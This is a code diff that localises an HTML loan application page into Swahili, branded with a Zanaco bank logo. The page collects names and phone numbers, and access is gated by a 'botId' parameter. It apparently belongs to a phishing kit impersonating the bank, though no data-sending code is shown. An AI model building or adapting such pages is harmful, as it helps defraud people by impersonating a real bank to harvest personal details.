@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application Form</title>
+<title>Fomu ya Maombi ya Mkopo</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -36,6 +36,22 @@ label { display: block; margin: 10px 0 5px; font-weight: bold; }
 input { width: 100%; padding: 10px; margin-bottom: 15px; }
 button { width: 100%; padding: 12px; background: red; color: #fff; border: none; }
 button:disabled { background: #ccc; }
+
+.checkbox-label {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 14px;
+    margin-bottom: 15px;
+    cursor: pointer;
+}
+
+.checkbox-label input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    accent-color: red;
+}
+
 </style>
 </head>
 <body>
@@ -45,27 +61,28 @@ button:disabled { background: #ccc; }
         <img src="zanaco-dp.jpeg" class="logo">
     </div>
 
-    <h2>Loan Application Form</h2>
+    <h2>Fomu ya Maombi ya Mkopo</h2>
 
     <form id="detailsForm">
-        <label>Full Name</label>
-        <input id="name" required>
+        <label>Jina Kamili</label>
+        <input id="name" placeholder="Jina" required>
 
-        <label>Phone Number</label>
-        <input id="phone" required>
+        <label>Nambari ya Simu</label>
+        <input id="phone" placeholder="+260" required>
 
-        <label>
-            <input type="checkbox" id="confirmCheck"> I agree to terms
+        <label class="checkbox-label">
+            <input type="checkbox" id="confirmCheck">
+            Nakubali masharti na huduma za Mikopo ya Zanaco
         </label>
 
-        <button id="nextBtn" disabled>Next</button>
+        <button id="nextBtn" disabled>Endelea</button>
     </form>
 </div>
 
 <script>
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
-if (!botId) { alert("Invalid access link"); throw new Error(); }
+if (!botId) { alert("Kiungo batili cha ufikiaji"); throw new Error(); }
 
 if (!localStorage.getItem('loanAmount')) {
     window.location.href = `index.html?botId=${botId}`;
